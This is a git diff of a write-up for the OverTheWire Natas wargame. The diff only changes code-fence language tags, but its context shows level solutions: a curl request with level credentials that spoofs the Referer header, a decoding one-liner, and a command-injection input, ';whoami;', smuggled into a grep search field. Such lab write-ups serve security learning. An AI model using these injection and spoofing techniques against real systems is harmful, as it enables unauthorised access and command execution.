@@ -53,13 +53,13 @@ In the source code, comments says something about even Google cannot find it, wh
 
 With the text, I assume it's going to be `Referer` in HTTP request. Use `curl` command to change it.
 
-```
+```bash
 curl -u "natas4:Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ" "http://natas4.natas.labs.overthewire.org/" --referer 'http://natas5.natas.labs.overthewire.org/'
 ```
 
 Response:
 
-```
+```html
 <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -96,7 +96,7 @@ The password will be shown once cookie is set.
 
 Let's view the source code.
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -161,7 +161,7 @@ Cool story bro. Now let's get the password since it was mentioned in the source 
 
 Source code:
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -210,7 +210,7 @@ Then to reverse it, first convert the value back to binary, and reverse it then 
 
 Here is the bash one-liner I ran.
 
-```
+```python
 python -c 'import base64; print base64.b64decode("3d3d516343746d4d6d6c315669563362".decode("hex")[::-1])'
 ```
 
@@ -224,7 +224,7 @@ Intuition tells me this is about sql injection.
 
 But anyway, let's check the source code.
 
-```
+```html
  <html>
 <head>
 <!-- This stuff in the header has nothing to do with the level -->
@@ -269,7 +269,7 @@ And it turns out not to be sql injection, but command injection. The `passthru` 
 
 Let me break the command down:
 
-```
+```bash
 grep -i ;whoami; echo dictionary.txt
 ```
 
